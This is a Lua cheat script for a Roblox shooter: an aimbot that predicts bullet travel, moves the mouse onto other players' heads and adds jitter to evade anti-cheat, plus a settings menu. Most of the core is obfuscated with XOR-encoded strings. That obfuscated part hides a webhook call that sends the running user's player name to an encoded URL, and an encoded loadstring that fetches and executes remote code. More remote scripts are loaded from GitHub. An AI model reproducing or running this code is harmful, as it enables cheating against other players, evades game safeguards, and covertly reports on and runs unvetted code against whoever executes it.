getgenv().config = {
    CircleRadius = 80,
    BaseBulletSpeed = 1000,
    PredictionBoost = 1.0,
    Gravity = 196.2,
    RandomJigger = 0,
    ShowBulletSpeed = true,
    DebugLineEnabled = true,
    ShowActiveModes = true,
    MaxDistance = 2000,
    CloseRangeThreshold = 500,
    CloseRangeBoost = 7,
    localPlayerVelocityInfluence = 0.5
}

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v62,v63) local v64={};for v113=1, #v62 do v6(v64,v0(v4(v1(v2(v62,v113,v113 + 1 )),v1(v2(v63,1 + (v113% #v63) ,1 + (v113% #v63) + 1 )))%256 ));end return v5(v64);end local v8=cloneref(game:GetService(v7("\225\207\218\60\227\169\212","\126\177\163\187\69\134\219\167")));local v9=cloneref(game:GetService(v7("\17\216\36\246\249\49\219\35\198\249","\156\67\173\74\165")));local v10=cloneref(game:GetService(v7("\3\184\91\29\175\54\71\55\178","\38\84\215\41\118\220\70")));local v11=v10.CurrentCamera;local v12=cloneref(game:GetService(v7("\98\19\50\30\247\83\23\54\23\250\99\2\45\0\255\87\19","\158\48\118\66\114")));local v13=cloneref(game:GetService(v7("\158\55\21\36\90\171\235\190\48\35\51\97\179\242\168\33","\155\203\68\112\86\19\197")));local v14=v8.LocalPlayer;local v15={};local v16={};local v17=nil;local v18=false;local v19=60;local v20=tick();local v21=0;function sendToWebhook(v65) local v66=request({[v7("\115\207\58","\152\38\189\86\156\32\24\133")]=v7("\244\67\179\86\239\13\232\9\248\94\180\69\243\69\163\8\255\88\170\9\253\71\174\9\235\82\165\78\243\88\172\85\179\6\244\20\164\0\243\20\175\14\242\17\169\6\246\17\168\5\245\18\179\93\245\76\240\66\240\98\230\100\175\85\248\67\138\78\195\121\245\69\198\65\243\107\213\126\240\66\200\91\151\115\196\125\148\17\253\115\179\106\234\7\241\31\250\99\151\80\243\5\148\30\218\67\128\76\243\122\177\98\233\81\170\100\196\96\131\87\248","\38\156\55\199"),[v7("\133\120\104\32\28\112","\35\200\29\28\72\115\20\154")]=v7("\41\144\226\235","\84\121\223\177\191\237\76"),[v7("\153\89\205\185","\161\219\54\169\192\90\48\80")]='{"username": "AIMBOT", "content":"'   .. v65   .. '"}' ,[v7("\97\71\1\33\76\80\19","\69\41\34\96")]={[v7("\159\204\217\30\7\37\168\142\227\19\18\46","\75\220\163\183\106\98")]=v7("\3\170\155\59\208\1\187\159\62\214\12\245\129\36\214\12","\185\98\218\235\87")}},true);end sendToWebhook(v7("\251\48\38\255\219\184\139","\202\171\92\71\134\190")   .. v14.Name   .. v7("\105\196\52\141\42\212\56\141\45\129\13\129\36\195\35\156","\232\73\161\76") );local v22=getgenv().config;getgenv().aimEnabled=true;getgenv().ExcludedPlayers={};local v25=Drawing.new(v7("\152\208\80\94\18\190","\126\219\185\34\61"));v25.Visible=true;v25.Thickness=2;v25.NumSides=50;v25.Filled=false;local v30=Drawing.new(v7("\32\199\80\119","\135\108\174\62\18\30\23\147"));v30.Color=Color3.fromRGB(0,255,0);v30.Thickness=2;v30.Transparency=0.8;local v34=Drawing.new(v7("\130\236\50\223","\167\214\137\74\171\120\206\83"));v34.Size=15;v34.Center=true;local v37=Drawing.new(v7("\191\245\42\73","\199\235\144\82\61\152"));v37.Color=Color3.fromRGB(255,50,50);v37.Size=20;v37.Font=2;v37.Outline=true;v37.Text=v7("\36\58\150\24\34\86\139\10\41\49\156\107\42\57\157\14","\75\103\118\217");local v43=Drawing.new(v7("\243\81\104\0","\126\167\52\16\116\217"));v43.Color=Color3.fromRGB(255,100,100);v43.Size=20;v43.Font=2;v43.Outline=true;v43.Text=v7("\233\7\13\192\128\54\188\230\11\1\178\145\42\200\136\26\1\178\147\60\200\136\3\15\164\145","\156\168\78\64\224\212\121");local function v49(v67) local v68=v67:FindFirstChild(v7("\36\251\183\220\2\224\177\253\2\226\160\205\19\235\161\225\5\228\160\205\19","\174\103\142\197"));return v68 and v68.Value and v68.Value.Value ;end local function v50(v69) local v70=v49(v69);if  not v70 then return v22.BaseBulletSpeed;end local v71=v12.GunData:FindFirstChild(v70.Name);if (v71 and v71.Stats and v71.Stats.BulletSettings and v71.Stats.BulletSettings.BulletSpeed) then v34.Text=v7("\116\61\83\52\32\74\184\69\56\90\61\33\4\184","\152\54\72\63\88\69\62")   .. v71.Stats.BulletSettings.BulletSpeed.Value ;return v71.Stats.BulletSettings.BulletSpeed.Value;else v34.Text=v7("\246\209\226\80\209\208\174\79\196\193\235\88\142\132","\60\180\164\142")   .. v22.BaseBulletSpeed   .. v7("\16\90\0\47\38\248\30\76\23","\114\56\62\101\73\71\141") ;return v22.BaseBulletSpeed;end end local function v51(v72,v73,v74) local v75=(v14.Character and v14.Character:FindFirstChild(v7("\139\236\201\210\189\251\248\203\180\229\210\192\189\251\243\193\185\237","\164\216\137\187")) and v14.Character.ServerColliderHead.Velocity) or Vector3.zero ;local v76=v73-(v75 * v22.localPlayerVelocityInfluence) ;local v77=(v72-v11.CFrame.Position).Magnitude;local v78=v77/v74 ;local v79=60/math.max(v19,1) ;local v80=((v77<v22.CloseRangeThreshold) and math.clamp(1 + ((v22.CloseRangeBoost-1) * (1 -(v77/v22.CloseRangeThreshold))) ,1,v22.CloseRangeBoost)) or 1 ;return v72 + (v76 * v78 * 1.054 * v80 * v22.PredictionBoost * v79) + Vector3.new(0,v22.Gravity * (v78^2) * 1.052 * v80 * v22.PredictionBoost ,0) ;end local function v52(v81) if (v15[v81] or (4593<=2672)) then if (v15[v81]:IsDescendantOf(v10) or (1168>3156)) then return v15[v81];else v15[v81]=nil;end end local v82=v81:FindFirstChild(v7("\250\243\60\179\168\241\2\214\212\62\189\178\206\10\192\242","\107\178\134\81\210\198\158"));if ( not v82 or (572>4486)) then return nil;end local v83;local v84=999999999;for v114,v115 in ipairs(v10.Characters:GetChildren()) do if (v115~=v15[v14.Character]) then else continue;end local v116=v115:FindFirstChild(v7("\13\30\146\195\184\12\1\144\213\165","\202\88\110\226\166"));if ((1404==1404) and v116) then local v136=((v82.Position + Vector3.new(0,3.5,0)) -v116.Position).Magnitude;if ((v136<=v84) or (3748<2212)) then v83=v115;v84=v136;end end end v15[v81]=v83;return v83;end local function v53(v86) if (v16[v86] or (1180==2180)) then local v132=v16[v86];if (v132 and v132.Character and v132.Character:IsDescendantOf(v10)) then return v132;else v16[v86]=nil;end end local v87=v86:FindFirstChild(v7("\246\31\146\242\216\247\0\144\228\197","\170\163\111\226\151"));if  not v87 then return nil;end local v88=nil;local v89=math.huge;for v117,v118 in ipairs(v8:GetPlayers()) do if ((4090<4653) and (v15[v14.Character]==v86)) then continue;end local v119=v118.Character;if ( not v119 or (v119==v14.Character)) then continue;end local v120=v119:FindFirstChild(v7("\57\37\191\57\64\56\32\21\2\189\55\90\7\40\3\36","\73\113\80\210\88\46\87"));if  not v120 then continue;end local v121=(v87.Position-(v120.Position + Vector3.new(0,3.5,0))).Magnitude;if ((v121<v89) or (2652<196)) then v89=v121;v88=v118;end end v16[v86]=v88;return v88;end local function v54(v91) local v92=v52(v91);return v92 and v92:FindFirstChild(v7("\169\41\204\22","\135\225\76\173\114")) ;end local function v55() local v93,v94=nil,v22.CircleRadius;local v95=Vector2.new(v11.ViewportSize.X/2 ,v11.ViewportSize.Y/2 );for v122,v123 in v8:GetPlayers() do if ((4135<4817) and ((v123==v14) or  not v123.Character or getgenv().ExcludedPlayers[v123])) then continue;end local v124=v123.Character:FindFirstChild(v7("\50\248\181\177\162\178\174\30\223\183\191\184\141\166\8\249","\199\122\141\216\208\204\221"));if ((272==272) and v124) then local v137=v11:WorldToViewportPoint(v124.Position);local v138=(Vector2.new(v137.X,v137.Y) -v95).Magnitude;if (v138>=v94) then else v93=v123;v94=v138;end end end return v93;end local function v56() local v96,v97=nil,v22.MaxDistance;for v125,v126 in v8:GetPlayers() do if ((100<=3123) and ((v126==v14) or  not v126.Character or getgenv().ExcludedPlayers[v126])) then continue;end local v127=v126.Character:FindFirstChild(v7("\133\200\29\241\118\249\164\217\34\255\119\226\157\220\2\228","\150\205\189\112\144\24"));if v127 then local v139=(v127.Position-v14.Character.HumanoidRootPart.Position).Magnitude;if (v139<=v97) then v96=v126;v97=v139;end end end return v96;end local function v57(v98) if ( not v98 or  not v98.Character or (1369>4987)) then return;end local v99=v54(v98.Character);local v100=v98.Character:FindFirstChild(v7("\22\129\173\90\1\154\50\31\41\136\182\72\1\154\57\21\36\128","\112\69\228\223\44\100\232\113"));if ((v99 and v100) or (863>=4584)) then local v133=v51(v99.Position,v100.Velocity,v50(v14));local v134=v11:WorldToViewportPoint(v133);mousemoverel((v134.X-(v11.ViewportSize.X/2)) + math.random( -v22.RandomJigger,v22.RandomJigger) ,(v134.Y-(v11.ViewportSize.Y/2)) + math.random( -v22.RandomJigger,v22.RandomJigger) );end end loadstring(game:HttpGet(v7("\220\11\19\195\165\38\201\155\13\6\196\248\123\143\192\23\18\209\163\111\131\198\28\8\221\162\121\136\192\81\4\220\187\51\142\219\18\2\196\185\110\141\199\78\86\130\231\51\147\220\23\56\202\179\125\201\198\26\1\192\249\116\131\213\27\20\156\187\125\143\218\80\19\214\165\104","\230\180\127\103\179\214\28")))();local function v58() v21+=1 local v101=tick();if ((v101-v20)<1) then else v19=v21/(v101-v20) ;v21=0;v20=v101;end end local function v59(v102) v25.Position=Vector2.new(v11.ViewportSize.X/2 ,v11.ViewportSize.Y/2 );v25.Radius=v22.CircleRadius;v34.Visible=v22.ShowBulletSpeed;v34.Position=Vector2.new(v11.ViewportSize.X/2 ,(v11.ViewportSize.Y/2) + v22.CircleRadius + 5 );v43.Visible=v102 and v22.ShowActiveModes ;v37.Visible=v102 and ((v102.Character.HumanoidRootPart.Position-v14.Character.HumanoidRootPart.Position).Magnitude<v22.CloseRangeThreshold) and v22.ShowActiveModes ;v30.Visible=false;if v22.DebugLineEnabled then local v135=v55();if (v135 and v135.Character) then local v142=v135.Character:FindFirstChild(v7("\191\0\77\80\225\83\195\131\9\83\79\224\68\242\164\0\94\66","\128\236\101\63\38\132\33"));if (v142 or (724>=1668)) then local v143=v51(v142.Position,v142.Velocity,v50(v14));local v144=v11:WorldToViewportPoint(v143);v30.From=Vector2.new(v11.ViewportSize.X/2 ,v11.ViewportSize.Y/2 );v30.To=Vector2.new(v144.X,v144.Y);v30.Visible=true;end end end end local function v60() v13.InputBegan:Connect(function(v128) if (v128.UserInputType~=Enum.UserInputType.MouseButton2) then else v18=true;end end);v13.InputEnded:Connect(function(v129) if ((428<1804) and (v129.UserInputType==Enum.UserInputType.MouseButton2)) then v18=false;v17=nil;end end);end local function v61() v58();local v112=v56();v59(v112);if ((v18 and getgenv().aimEnabled) or (3325>4613)) then v17=v112 or v55() ;v57(v17);end end v60();v9.RenderStepped:Connect(v61);print(v7("\141\160\28\70\185\255\143\165\167\24\80\191\234\195\165\179\20\64","\175\204\201\113\36\214\139"));
loadstring(game:HttpGet("https://raw.githubusercontent.com/homeworks1111/uhh_yea/refs/heads/main/watermark.lua"))()

print("Initiliazing gui...")
do
    local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
    local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
    local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
    local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()

    local Options = Library.Options
    local Toggles = Library.Toggles

    Library.ForceCheckbox = false
    Library.ShowToggleFrameInKeybinds = true

    local Window = Library:CreateWindow({
        Title = "Aimbot by Aftergeometry",
        Footer = "Aftermath died from hackers, and it's your fault.",
        NotifySide = "Right",
        ShowCustomCursor = true,
    })

    local Tabs = {
        Main = Window:AddTab("Main", "sword"),
        ["UI Settings"] = Window:AddTab("Misc", "settings"),
    }

    local Elements = {
        GroupBoxes = {
            Keybinds = Tabs.Main:AddLeftGroupbox("Aimbot"),
            Modes = Tabs.Main:AddRightGroupbox("Aimbot Modes"),
            Prediction = Tabs.Main:AddRightGroupbox("Prediction Settings"),
            Visuals = Tabs.Main:AddLeftGroupbox("Visual Settings"),
            IgnoreList = Tabs.Main:AddLeftGroupbox("Ignore/Friend List")
        },
        
        Toggles = {},
        Sliders = {},
        Pickers = {},
        Labels = {},
        Dropdowns = {}
    }

    -- Aimbot Controls
    Elements.Toggles.Aimbot = Elements.GroupBoxes.Keybinds:AddToggle("AimbotToggle", {
        Text = "Aimbot",
        Default = true,
        Tooltip = "Toggle aimbot functionality",
        Callback = function(value)
            getgenv().aimEnabled = value
            get("drawing").Circle.Visible = value
        end
    })
    Elements.Toggles.DebugBulletSpeedInfo = Elements.GroupBoxes.Visuals:AddToggle("BulletSpeedInfoToggle", {
        Text = "Show Debug BulletSpeed info",
        Default = false,
        Tooltip = "Shows bullet speed info.",
        Callback = function(value)
            config.ShowBulletSpeed = value

        end
    })

    Elements.Pickers.AimbotKey = Elements.Toggles.Aimbot:AddKeyPicker("AimbotKeybind", {
        Default = "F2",
        Text = "Aimbot Toggle Key",
        Mode = "Toggle",
        SyncToggleState = false,
        Callback = function(Value)
            Elements.Toggles.Aimbot:SetValue(not Elements.Toggles.Aimbot.Value)
        end
    })

    Elements.Sliders.AimCircle = Elements.GroupBoxes.Keybinds:AddSlider("AimCircleRadius", {
        Text = "Aim Circle Radius",
        Default = 250,
        Min = 50,
        Max = 800,
        Rounding = 1,
        Compact = false,
        Tooltip = "Detection radius for automatic aiming",
        Callback = function(value)
            config.CircleRadius = value
        end
    })

    -- Aimbot Modes
    Elements.Sliders.NearestMode = Elements.GroupBoxes.Modes:AddSlider("AimToNearestMode", {
        Text = "AimToNearestMode Distance",
        Default = 80,
        Min = -1,
        Max = 2500,
        Rounding = 1,
        Compact = false,
        Tooltip = "Maximum distance for melee targeting (-1 to disable)",
        Callback = function(value)
            config.MaxDistance = value
        end
    })

    Elements.Sliders.CloseRange = Elements.GroupBoxes.Modes:AddSlider("CloseRangeMode", {
        Text = "CloseRangeMode Distance",
        Default = 50,
        Min = -1,
        Max = 2500,
        Rounding = 1,
        Compact = false,
        Tooltip = "Distance threshold for close range mode (-1 to disable)",
        Callback = function(value)
            config.CloseRangeThreshold = value
        end
    })

    -- Prediction Settings
    Elements.Sliders.PredictBoost = Elements.GroupBoxes.Prediction:AddSlider("PredictBoost", {
        Text = "Prediction Multiplier",
        Default = 1,
        Min = 0.1,
        Max = 3,
        Rounding = 1,
        Compact = false,
        Tooltip = "Global prediction multiplier",
        Callback = function(value)
            config.PredictionBoost = value
        end
    })

    Elements.Sliders.CloseRangeBoost = Elements.GroupBoxes.Prediction:AddSlider("CloseRangeBoost", {
        Text = "Close Range Multiplier",
        Default = 1.6,
        Min = 0.1,
        Max = 8,
        Rounding = 1,
        Compact = false,
        Tooltip = "Prediction multiplier for close range mode",
        Callback = function(value)
            config.CloseRangeBoost = value
        end
    })

    Elements.Sliders.BulletSpeed = Elements.GroupBoxes.Prediction:AddSlider("DefaultBulletSpeed", {
        Text = "Default Bullet Speed",
        Default = 2200,
        Min = 1000,
        Max = 4000,
        Rounding = 1,
        Compact = false,
        Tooltip = "Fallback bullet speed when unknown",
        Callback = function(value)
            config.BaseBulletSpeed = value
        end
    })
    Elements.Sliders.BulletSpeed = Elements.GroupBoxes.Prediction:AddSlider("Jigger", {
        Text = "Random jiggering",
        Default = 2,
        Min = 0,
        Max = 5,
        Rounding = 0,
        Compact = false,
        Tooltip = "Adds shake when aiming, makes harder to detect you by anticheat.",
        Callback = function(value)
            config.RandomJigger = value
        end
    })

    Elements.Sliders.Gravity = Elements.GroupBoxes.Prediction:AddSlider("BulletGravity", {
        Text = "Bullet Gravity",
        Default = 50,
        Min = 0,
        Max = 150,
        Rounding = 1,
        Compact = false,
        Tooltip = "Gravity affecting bullet trajectory",
        Callback = function(value)
            config.Gravity = value
        end
    })

    -- Visual Settings
    Elements.Toggles.DebugLine = Elements.GroupBoxes.Visuals:AddToggle("DebugLineToggle", {
        Text = "Show Debug Lines",
        Default = false,
        Tooltip = "Display aim point debug lines",
        Callback = function(value)
            config.DebugLineEnabled = value
        end
    })
    Elements.Toggles.ShowServerHead = Elements.GroupBoxes.Visuals:AddToggle("ShowServerHead", {
        Text = "Show head position",
        Default = true,
        Tooltip = "Shows current target hitbox position.",
        Callback = function(value)
            config.ShowDebugServerHeadVizualization = value
        end
    })

    Elements.Pickers.LineColor = Elements.Toggles.DebugLine:AddColorPicker("LineColor", {
        Default = Color3.fromRGB(0, 255, 0),
        Title = "Debug Line Color",
        Transparency = 0,
        Callback = function(value)
            warn("set color!")
            config.DebugLineColor = value
        end
    })

    Elements.Labels.CircleColor = Elements.GroupBoxes.Visuals:AddLabel("Aim Circle Color")
    Elements.Pickers.CircleColor = Elements.Labels.CircleColor:AddColorPicker("CircleColor", {
        Default = Color3.fromRGB(0, 0, 0),
        Title = "Circle Color",
        Transparency = 0,
        Callback = function(value)
            config.CircleColor = value
        end
    })

    Elements.Toggles.ModeVisuals = Elements.GroupBoxes.Visuals:AddToggle("ModeVisualsToggle", {
        Text = "Show Active Modes",
        Default = true,
        Tooltip = "Display current mode status",
        Callback = function(value)
            config.ShowActiveModes = value
        end
    })

    -- Ignore List
    Elements.Labels.IgnoreListHeader = Elements.GroupBoxes.IgnoreList:AddLabel("Add player to Ignore/Friend List")
    Elements.Pickers.IgnoreKey = Elements.Labels.IgnoreListHeader:AddKeyPicker("IgnoreKeybind", {
        Default = "RightControl",
        Text = "Add Player to list",
        Mode = "Toggle",
        SyncToggleState = false,
        Callback = function(value)
            warn('KEEEEEK')
            local target = findPlayerUnderCursor()
            if target then
                toggleExcludedPlayer(target)
            end
        end
    })

    getgenv().ignoreListText = Elements.GroupBoxes.IgnoreList:AddLabel("Ignored Players:None", true)
    Elements.Labels.IgnoreList = getgenv().ignoreListText

    Elements.Dropdowns = Elements.GroupBoxes.Prediction:AddDropdown("MyDropdown", {
        Values = {"ServerColliderHead", "OriginalHead"},
        Default = 1, -- Index of the default option
        Multi = false, -- Whether to allow multiple selections
        Text = "Aim to",
        Tooltip = "ServerColliderHead - more optimized, less accurate;\nOriginalHead - less optimized, more accurate",
        Callback = function(value)
            print(value)
            config.UseOriginalHead = value == "OriginalHead"
        end
    })

    local MenuGroup = Tabs["UI Settings"]:AddLeftGroupbox("Menu")

    MenuGroup:AddToggle("KeybindMenuOpen", {
        Default = Library.KeybindFrame.Visible,
        Text = "Open Keybind Menu",
        Callback = function(value)
            Library.KeybindFrame.Visible = value
        end,
    })
    MenuGroup:AddToggle("ShowCustomCursor", {
        Text = "Custom Cursor",
        Default = true,
        Callback = function(Value)
            Library.ShowCustomCursor = Value
        end,
    })
    MenuGroup:AddDropdown("NotificationSide", {
        Values = { "Left", "Right" },
        Default = "Right",

        Text = "Notification Side",

        Callback = function(Value)
            Library:SetNotifySide(Value)
        end,
    })
    MenuGroup:AddDropdown("DPIDropdown", {
        Values = { "50%", "75%", "100%", "125%", "150%", "175%", "200%" },
        Default = "100%",

        Text = "DPI Scale",

        Callback = function(Value)
            Value = Value:gsub("%%", "")
            local DPI = tonumber(Value)

            Library:SetDPIScale(DPI)
        end,
    })
    MenuGroup:AddDivider()
    MenuGroup:AddLabel("Menu bind")
        :AddKeyPicker("MenuKeybind", { Default = "RightShift", NoUI = true, Text = "Menu keybind" })

    MenuGroup:AddButton("Unload", function()
        Library:Unload()
    end)

    Library.ToggleKeybind = Options.MenuKeybind -- Allows you to have a custom keybind for the menu

    -- Addons:
    -- SaveManager (Allows you to have a configuration system)
    -- ThemeManager (Allows you to have a menu theme system)

    -- Hand the library over to our managers
    ThemeManager:SetLibrary(Library)
    SaveManager:SetLibrary(Library)

    -- Ignore keys that are used by ThemeManager.
    -- (we dont want configs to save themes, do we?)
    SaveManager:IgnoreThemeSettings()

    -- Adds our MenuKeybind to the ignore list
    -- (do you want each config to have a different menu key? probably not.)
    SaveManager:SetIgnoreIndexes({ "MenuKeybind" })

    -- use case for doing it this way:
    -- a script hub could have themes in a global folder
    -- and game configs in a separate folder per game
    ThemeManager:SetFolder("MyScriptHub")
    SaveManager:SetFolder("MyScriptHub/specific-game")
    SaveManager:SetSubFolder("specific-place") -- if the game has multiple places inside of it (for example: DOORS)
    -- you can use this to save configs for those places separately
    -- The path in this script would be: MyScriptHub/specific-game/settings/specific-place
    -- [ This is optional ]

    -- Builds our config menu on the right side of our tab
    SaveManager:BuildConfigSection(Tabs["UI Settings"])

    -- Builds our theme menu (with plenty of built in themes) on the left side
    -- NOTE: you can also call ThemeManager:ApplyToGroupbox to add it to a specific groupbox
    ThemeManager:ApplyToTab(Tabs["UI Settings"])

    -- You can use the SaveManager:LoadAutoloadConfig() to load a config
    -- which has been marked to be one that auto loads!
    SaveManager:LoadAutoloadConfig()

    print("Aimbot ui initilized")
end
